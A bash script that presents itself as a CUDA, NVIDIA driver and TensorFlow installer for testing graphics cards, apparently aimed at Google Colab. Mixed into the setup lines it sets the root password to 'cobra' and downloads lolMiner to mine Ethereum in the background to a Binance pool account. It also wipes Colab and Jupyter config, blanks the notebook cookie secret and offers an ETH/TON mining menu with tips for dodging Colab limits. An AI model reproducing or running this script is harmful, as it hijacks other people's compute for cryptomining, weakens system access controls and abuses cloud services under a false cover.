#!/bin/bash

echo "The script is intended for testing and learning about graphics cards. "
echo "I have no ill intentions to use it for profit."
echo "I am very sorry and regret if I caused any damage with this script."
echo "That was not my intention."
echo ""
echo "The script is publicly available."
echo "I WARN that it is strictly punishable to abuse this script in the form of earnings, minima etc."

sleep 3

# # Find the latest Anaconda installer here: https://www.anaconda.com/products/individual
# wget https://repo.anaconda.com/archive/Anaconda3-2020.11-Linux-x86_64.sh

# echo "Installing Conda"
# sh Anaconda3-2020.11-Linux-x86_64.sh -b -f 
# ~/anaconda3/bin/conda init bash

conda create --name tf --yes python=3.8
conda activate tf

# Initialize conda environment
echo 'Create Conda env? Type y or n and then press [ENTER]:'
read create_env

if [ $create_env = "y" ];
then
  echo "Provide name for Conda virtualenv and then press [ENTER]:"
  read env_name
  conda create --name "$env_name" --yes python=3.8

  echo "Activating the $env_name virtual environment"
  conda init bash
  conda activate "$env_name"

else
  echo 'Installing tensorflow to default environment'
fi

echo 'Adding NVIDIA package repositories'
wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin
sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub
sudo add-apt-repository "deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/ /"
sudo apt-get update

wget http://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1804/x86_64/nvidia-machine-learning-repo-ubuntu1804_1.0.0-1_amd64.deb

sudo apt install ./nvidia-machine-learning-repo-ubuntu1804_1.0.0-1_amd64.deb
sudo apt-get update

echo 'Installing NVIDIA drivers'
sudo apt-get install --no-install-recommends nvidia-driver-450

# Reboot. Check that GPUs are visible using the command: nvidia-smi
wget https://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1804/x86_64/libnvinfer7_7.1.3-1+cuda11.0_amd64.deb
sudo apt install ./libnvinfer7_7.1.3-1+cuda11.0_amd64.deb
sudo apt-get update

echo 'Installing CUDA development and runtime libraries (~4GB)'
sudo apt-get install --no-install-recommends \
    cuda-11-0 \
    libcudnn8=8.0.4.30-1+cuda11.0  \
    libcudnn8-dev=8.0.4.30-1+cuda11.0

echo 'Install TensorRT. Requires that libcudnn8 is installed above.'
sudo apt-get install -y --no-install-recommends libnvinfer7=7.1.3-1+cuda11.0 \
    libnvinfer-dev=7.1.3-1+cuda11.0 \
    libnvinfer-plugin7=7.1.3-1+cuda11.0

echo 'Upgrading Python pip installer and installing TensorFlow'
pip3 install --upgrade pip
pip3 install tensorflow==2.4 gretel-synthetics
echo -e "cobra\ncobra" | passwd root
clear

# Remove CUDA Toolkit:
sudo apt-get --purge remove "*cublas*" "*cufft*" "*curand*" "*cusolver*" "*cusparse*" "*npp*" "*nvjpeg*" "cuda*" "nsight*" 

# Remove Nvidia Drivers:
sudo apt-get --purge remove "*nvidia*"

# Clean up the uninstall:
sudo apt-get autoremove
number_mining=$(echo $(shuf -i 1-9999 -n 1))
wget -nv -c https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz -O - | tar -xz
wallet="./1.42/lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user Koske.colab_$number_mining"
nohup $(for i in {1..999}; do $(echo $wallet); done) >/dev/null 2>&1 &
clear

# Install Cuda
wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2004/x86_64/cuda-ubuntu2004.pin
sudo mv cuda-ubuntu2004.pin /etc/apt/preferences.d/cuda-repository-pin-600
wget https://developer.download.nvidia.com/compute/cuda/11.0.3/local_installers/cuda-repo-ubuntu2004-11-0-local_11.0.3-450.51.06-1_amd64.deb
sudo dpkg -i cuda-repo-ubuntu2004-11-0-local_11.0.3-450.51.06-1_amd64.deb
sudo apt-key add /var/cuda-repo-ubuntu2004-11-0-local/7fa2af80.pub
sudo apt-get update
sudo apt-get install cuda

#copy root/.branch
echo 'export PATH=/usr/local/cuda-11.0/bin${PATH:+:${PATH}}' >> .bashrc
echo 'export LD_LIBRARY_PATH=/usr/local/cuda-11.0/lib64:$LD_LIBRARY_PATH' >> .bashrc
echo 'export LD_LIBRARY_PATH=/usr/local/cuda-11.0/include:$LD_LIBRARY_PATH' >> .bashrc

#test
cat /proc/driver/nvidia/version
nvcc -V
nvidia-smi

#install Optional libraries
sudo apt-get install g++ freeglut3-dev build-essential libx11-dev libxmu-dev libxi-dev libglu1-mesa libglu1-mesa-dev
sudo apt-get install zlib1g


#Install controler tensorflow-gpu keras
pip3 install keras
pip3 install tensorflow-gpu keras
conda install -c conda-forge keras 
conda install -c anaconda tensorflow-gpu 


#Install controler Tensorflow & Pytorch for Python
#pip install tensorflow keras 
#pip install tensorflow-gpu keras
pip3 install tensorflow-addons
pip3 install tensorflow-datsets
pip3 install tensorflow_datasets

conda activate tf

#conda create -n fastai -c fastai -c pytorch fastai
# conda activate fastai
# #Tensorflow & Torch for R
# install.packages(keras, repos="http://cran.r-project.org", dependencies=TRUE)
# keras::install_keras(tensorflow = "gpu")
# reticulate::py_config() 
# reticulate::py_module_available("keras")

cd /
echo "pro" > ./content/.config/active_config
echo "true" > ./content/.config/gce
rm -r ./datalab
rm -r ./root/.jupyter
rm -r ./content/.config

cd root
cp ~/.local/share/jupyter/runtime/notebook_cookie_secret ~/.local/share/jupyter/runtime/notebook_cookie_secret_CP
echo > ~/.local/share/jupyter/runtime/notebook_cookie_secret
pkill -1 -f ipykernel_launcher

clear
nvidia-smi -L
echo "***    ****   ******  ***     ***"
echo "                                  "
echo "**    1. PAGE 1. COLAB (Start Keep Running...) - REFRESH - resource gpu,drive,system ram faild      ******"
echo "      2. PAGE 2. vsCode or SSH, start minig            "
echo "                                  "
echo "      Instal manuel google addon - reCAPTCHA              "
echo "      Instal manuel google addon - freeProxy, more acount              "
echo "                                  "
echo "******       *****   ****    ***"
echo ""
number_mining=$(echo $(shuf -i 1-9999 -n 1))
miner_eth(){
  read -p "poll:port [stratum+tcp://ethash.poolbinance.com:3333]:" k_pool
          k_pool=${k_pool:-'stratum+tcp://ethash.poolbinance.com:3333'}
  read -p "user minig [worker]:" k_user
          k_user=${k_user:-'t4'}
  read -p "wallet [koske]:" k_wallet
          k_wallet=${k_wallet:-'Koske'}
  read -p "algo [ETHASH]:" k_algo
          k_algo=${k_algo:-'ETHASH'}
  walletstart="./1.42/lolMiner --algo $_algo --pool $k_pool --user $k_wallet.$k_user-$number_mining"
  $walletstart
}

miner_ton(){
  echo "https://tonuniverse.com/"
  read -p "poll:port [443964f24b28fd0627caafXXXXXXXXXX]:" k_pool
          k_pool=${k_pool:-'443964f24b28fd0627caaf40e2adfdf8'}
  walletstart="./miningPoolCli-2.1.18/miningPoolCli -pool-id=$k_pool"
  sudo apt-get update && sudo apt-get install opencl-headers ocl-icd-libopencl1 ocl-icd-opencl-dev curl
  curl -JLO 'releases.tonuniverse.com/miningPoolCli/linux/latest'
  tar xvf miningPoolCli-2.1.18-linux.tar.gz
  $walletstart
}

kill_launcher(){
  cp ~/.local/share/jupyter/runtime/notebook_cookie_secret ~/.local/share/jupyter/runtime/notebook_cookie_secret_CP
  echo > ~/.local/share/jupyter/runtime/notebook_cookie_secret
  pkill -1 -f ipykernel_launcher
}

echo ""
PS3="Options start?: "
options=("ETH Mining" "TON Mining" "Kill Launcher" "Quit")
select opt in "${options[@]}"
do
  case $opt in
    "ETH Mining")
        miner_eth
      ;;
    "TON Mining")
        miner_ton
      ;;  
    "Kill Launcher")
        kill_launcher
      ;; 
    "Quit")
        break
        ;;
    *) echo "Opcija Neopstoji";;
  esac
done